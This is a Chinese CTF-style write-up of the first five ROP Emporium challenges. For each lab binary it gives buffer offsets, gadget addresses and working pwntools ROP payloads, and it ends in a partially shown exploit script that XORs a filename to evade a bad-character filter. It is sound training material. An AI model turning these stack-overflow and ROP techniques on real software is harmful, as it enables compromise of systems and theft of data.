---
title: ROP Emporium 前五题笔记：从栈对齐到坏字符绕过
url: https://mp.weixin.qq.com/s/YHJTAk9TAxsEOvqpcgQYEg
source: Doonsec's feed
date: 2026-09-20
fetch_date: 2026-09-21T07:23:07.306430
---

# ROP Emporium 前五题笔记：从栈对齐到坏字符绕过

# ROP Emporium 前五题笔记：从栈对齐到坏字符绕过

Licharse
Licharse

Licharsec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

ROP Emporium 前五题的完整做题笔记：从「栈离 rbp 多远」这种最基础的计算开始，一路处理 64 位栈对齐、寄存器传参、没有写内存函数时自己找 mov gadget 写数据，最后用异或绕过坏字符检测。

每题都附 IDA 截图、payload 和可运行的 exp.py。
环境：Ubuntu + pwntools + IDA，二进制统一放在 /mnt/hgfs/pppwn/ 下。

AI做了下排版，看起来舒服点

题目总览

| # | 题目 | 核心考点 | 状态 |
| --- | --- | --- | --- |
| 1 | ret2win | 栈溢出 + 64 位栈对齐（用 ret 填充） | ✅ |
| 2 | split | 函数与参数分离，pop rdi; ret 传参 | ✅ |
| 3 | callme | 顺序调用多个函数，每个都要凑齐 3 个寄存器参数 | ✅ |
| 4 | write4 | 没有现成写内存函数时，自己找 mov 类 gadget | ✅ |
| 5 | badchars | 坏字符绕过：异或加密 + 运行时还原 | ✅ |

一、ret2win

1. 从 main 找到 pwnme()

第一步永远是看程序从哪进：main 里先 setbuf，然后直接调用 pwnme()。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0Kib7mBzzmozSnvwCP3oyGB44sT5EQVUF7EFpwVfG7LultRl0fYKuLAuoB3EtPS9nWAR3Odvz7vfFGyauTH2adH5R8DvUkb6t4Q/640?wx_fmt=png&from=appmsg)

图 1 · main 里先 setbuf，然后直接调用 pwnme()

2. 漏洞点：read 写进 32 字节的缓冲区

进去 pwnme() 之后，看到经典的 read 写入：

• 缓冲区 char s[32] 距离 rbp 为 0x20

• 所以覆盖到返回地址需要的偏移 = 0x20 + 8 = 0x28

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0L2lzCRoFZrpgxIr2qcylquGTuDicXuXhZTErksBr5EfoPbpRxvaDGP1ibnOcXg7R7E0rgX4reAf96PViaZVrHpLt0c2foyVSLMDE/640?wx_fmt=png&from=appmsg)

图 2 · pwnme() 伪代码：read(0, s, 0x38uLL)，空间明显不够

3. checksec：NX 开着，只能走 ROP

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0IBGhIOuhoPaA47VmYmgnolyk7657vzy6aSCsVSWc3vhibB3YPO34EOtoCAPQ6UqFGPHbqKZMTYIEhIibia54m7S1qDEf9227Cvak/640?wx_fmt=png&from=appmsg)

图 3 · checksec ret2win

64 位、无 canary、无 PIE，但 **NX 开启** —— 栈不可执行，所以构造 ROP 链条是唯一的出路。

4. 找有没有「一发入魂」的函数

• 先在 IDA 的 **Strings 窗口**里翻现成可用的字符串

• 双击目标字符串，按 **Ctrl + X** 查交叉引用（xrefs）

• 结果发现程序自带 ret2win() 函数，内部直接处理 /bin/cat flag.txt，等于白送 flag

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0JWWdGuQ616P1jAuxaa4PsAVWt0g8iaEesTWKibrbzDBvqFibymJic6q1ywRibCfJAGLkvj1EABTFlJw7b85hqpVl7aMKu7ZLiavP61A/640?wx_fmt=png&from=appmsg)

图 4 · Strings 窗口：/bin/cat flag.txt 就在 .rodata 里

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0JXhTiaxwOyYiaE8NUDq51pjibZDGduze79X2Fb3l3pt746iajxTq0xSspfDIlQJeAyQicHwFBnNNWYamGKDPKFCNKjqE3xmPIA7eP0/640?wx_fmt=png&from=appmsg)

图 5 · Ctrl + X 查引用，定位到 ret2win 函数

5. 构造 payload：这里有个栈对齐的坑

```
payload = offset * b'A' + p64(ret2win)
```

直接跳过去会崩：需要栈对齐

这样写**无法正确打印**，因为 64 位下要求栈 16 字节对齐（rsp % 16 == 0），否则会触发段错误，进程直接死掉。
因此需要找一个 ret 地址来做衔接对齐。注意：**不能随便填字节**，因为要的是 ret 这种只做「pop + 跳转」的指令；换成 pop 之类的指令会改变程序流向，导致中断。

修改后：

```
ret = 0x40053e  payload = flat(     b'A' * offset,     p64(ret),     p64(ret2win) )
```

6. 结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0JOv6njz6VrozicdNEZK44eHTb0jEUSLnonqv0CYo7rC2GeooVrWO3OY6lULHmJT9Zeh4054WL9uqtFU19SMVwOiaI0Sk8zWlFgk/640?wx_fmt=png&from=appmsg)

图 6 · 成功拿到 ROPE{a\_placeholder\_32byte\_flag!}

二、split

考点：函数与参数分离

程序已经把 system 给你了，但 /bin/cat flag.txt 这个参数需要你自己传进去。

构造 payload

```
payload = 0x28 * b'A' + p64(pop_rdi_ret) + p64(0x601060) + p64(system)
```

同样的问题：需要构造**栈平衡**。调用 system 这类函数必须满足 rsp % 16 == 0 才能对齐，所以得在前面补一个 ret：

```
payload  = 0x28 * b'A' + p64(ret) payload += p64(pop_rdi_ret) + p64(0x601060) + p64(system)
```

这里的 0x601060 就是 /bin/cat flag.txt 字符串的地址。

三、callme

题目要求

必须**按顺序**调用 callme\_one()、callme\_two()、callme\_three()，且每个函数都要带上参数 0xdeadbeef、0xcafebabe、0xd00df00d。
对于 **x86\_64** 二进制，这些值要加倍成 64 位，例如 0xdeadbeefdeadbeef、0xcafebabecafebabe、0xd00df00dd00df00d。
解题思路很简单：利用对 PLT 内部结构的了解，按上述顺序并带上正确参数调用函数即可。（如果你挑战的是 MIPS 版本，别忘了分支延迟槽。）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0LicFzXDQMbVlATJehQSSURHauUmFazYeTUwxXg1wVcb0Fpbl1NYl4JtJuqs5icA61vn84VNvlFar0b1QibRZh801WmKLmp5fGeaw/640?wx_fmt=png&from=appmsg)

图 7 · callme 题目原文提示

构造 payload

按照调用顺序先把栈配平，然后依次把参数塞进寄存器：64 位通过寄存器传参，用「函数 → 返回地址」的嵌套逻辑串起来。

```
payload  = cyclic(offset) + p64(ret) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_one) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_two) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_three)
```

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0IqGaERwZGma6GcLD2A0hicPaWx9DcVTVeCiasAXLLmagCfxEHMwa9U8bfkfvNGBp9lAzQFGt0w0oNUAtoqzBBNebPD2MpGNJI58/640?wx_fmt=png&from=appmsg)

图 8 · 三个函数依次 called correctly，拿到 flag

四、write4

题目提示（原文）

PLT 中有一个名为 print\_file() 的条目存在于挑战二进制文件中，只需将要读取的文件名（例如 flag.txt）作为第一个参数调用它即可。

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0LXqEBbxGdicP1cw6fvVFueEp2WXgMic5gJ3A0hHNMI5f5uvSiaqQ64ge9vly25TicbwiaMFTmUGvI7gLo12P1Inha5AwufZd03CM9M/640?wx_fmt=png&from=appmsg)

图 9 · write4 题目提示原文

1. 先看附件

发现给了多个附件，其中一个是 so 文件。看主函数的时候发现 pwnme 之类的函数都没有具体代码，所以把 so 在 IDA 里打开，发现相关内容和之前是一样的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0IOkltcJn4NXPNjufP9p95br2QD3eXlibpo4RlPNaFkRjNEdJxIEmstrl3pICVOXpz2tYeeicbI4X7GL91y0v6TrNlzEe9ca5cBE/640?wx_fmt=png&from=appmsg)

图 10 · 函数体都在 libwrite4.so 里

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0IncvfXb0114koicBJXNJuy0zWFVibXAlbOAm84u2deAiaFrSZicRiat7wzSpZmEJ2iaCtv1thazdibBfIXaYib7xfjS9iaPo1AQ6PmNthY/640?wx_fmt=png&from=appmsg)

图 11 · print\_file() 内部就是 fopen → fgets → puts

所以思路最开始很清晰：**查找可写段 → 写入需要的参数 → 调用给的漏洞函数然后传参拿 flag**。

2. 难点：没有现成的写内存函数

但一路找下来，发现并没有可以直接写入的函数给我们使用，此路不通 —— 这就是本题的考点。直接查询 gadget 是无效的，不过看到 IDA 编译给了个函数：

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0K7u3Ce5XNgnGZSlABN7bF2VEAJ6NbnFOHrTMYpGGMBOmDibicLfWYGibZEVybvQUpDAo1oa7wrg27zV2KmLzmMsI7JDw1yicUU9Qw/640?wx_fmt=png&from=appmsg)

图 12 · usefulGadgets()：\*v0 = v1，即把 r15 的内容写进 r14 指向的地址

能够令 r14 指向的地址写入 r15 的内容，这个可以拿来写入指定地点，然后后续再传参进去。

3. payload

```
payload  = cyclic(offset) + p64(ret) + p64(pop_r14_r15) payload += p64(bss) + b'flag.txt' + p64(mov_r14_r15) payload += p64(pop_rdi) + p64(bss) + p64(print_file)
```

4. 学到的新思路

收获

① 有时候**没有写内存的函数**，但可以去找找有没有自带赋值的 mov 类指令（如 mov [reg], reg），通过这种方式写入参数然后调用。
② 参数**字符串传递时不需要 p64**，p64 只用在地址 / 整数上。

五、badchars

1. 漏洞与坏字符机制

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0J5YuSE27unQPMSsQj3eZkQoG8CKLuXOrCDknamBCeia4nw136xjeOntFHEOg19e3wN1971j4vSJiakVcIicupSuf4XFyZqAQWILo/640?wx_fmt=png&from=appmsg)

图 13 · pwnme() 里 puts 出坏字符 x / g / a / . ，随后扫描缓冲区把命中的字节替换成 -21

常规做法需要填写参数 flag.txt，按照上一题的做法就行；但因为**会检测坏字符并被更改**，所以要另想办法解决。

2. 别只在 Functions 窗口里找 gadget

重点

题目给的 usefulGadgets 函数**不会在 Functions 列表里显示**，只会在 .text 段里显示。
所以以后做题，**看一下 .text 段也很有必要**。

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0I1F80zZTkDSq4uMMS2wN7jXNNyTGicklicq1xU6iajAILcdUJLicWhYL1c5soktcKoicp6GLzibKW7Y2hNUS1aeEl6BiaxibhicAWIATOU/640?wx_fmt=png&from=appmsg)

图 14 · .text 段里的 usefulFunction 与 usefulGadgets

3. 关键：检测发生的时机

看起来检测在 read 后面，但是并不是这样的。

**时间线：**

• ① read → 栈上落下 payload（全干净：地址无坏字符 + 字符串是 "dnce,vzv" 编码版）

• ② 坏字符扫描 loop → 逐个比对缓冲区 → 找不到 'x''g''a''.' → 0 处替换，什么也没发生

• ③ puts("Thank you!")

• ④ leave; ret → 开始执行这条「原封未动」的 ROP 链

并且看汇编代码可以看到，call read 是在检测字符后面的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/TmfJFw8PQ0JKCuibG7urzDSzrplwN7cy3AsvfDibQVfxcXibHclnBoq61AaG2bZruRVgJS1TOYUKgWPwyhh0kHrdNmiag9T0Nc00LQxvrTdtupI/640?wx_fmt=png&from=appmsg)

图 15 · 汇编顺序：printf("> ") 之后才 call read

4. 思路：异或两次还原

所以思路就是：先送进去**可以越过检测的内容**，然后在构造 ROP 链条的时候，先把参数做变换、再还原为 flag.txt，最终进行和上面一样的利用。

这里用**异或**：利用性质 —— 对同一个参数异或两次就恢复原来的值。

5. 找 gadget 的过程

这题因为要写地址参数，而它没有 r14 = r15，有的是 r13 和 r12。不知道为什么作者给的 gadget 没有显示出来，得一个个找，这里看了 WP。

![](https://mmbiz.qpic.cn/mmbiz_png/TmfJFw8PQ0J9qvWXENlxSiaUdoQSyQ2tyWyiaCg9yZklsz4n7NibqtmZSxLxw9Dd4rqIO0Gic6QcBLRiaSe9vCtO2CPPdoMGpQbXiaPImzbBGfice8/640?wx_fmt=png&from=appmsg)

图 16 · ROPgadget 找 r12，命中 mov qword ptr [r13], r12 ; ret

6. 具体的 POC

```
#!/usr/bin/env python3-- coding: utf-8 --from pwn import *context.binary = elf = ELF('/mnt/hgfs/pppwn/badchars')context.log_level = 'info'io = process(elf.path)io = remote('HOST', PORT)=== addresses ===ret                 = 0x4004eepop_rdi             = 0x4006a3pop_r12_r13_r14_r15 = 0x40069cmov_r13_r12         = 0x400634pop_r14_r15         = 0x4006a0xor_r14b_ptr_r15    = 0x400628bss                 = 0x601038print_file          = 0x400510=== data ===filename = b'flag.txt'enc = bytes(c ^ 0x02 for c in filename)=== exploit ===offset = 0x28payload = flat(b'A' * offset,ret,# [bss] = encrypted "flag.txt"pop_r12_r13_r14_...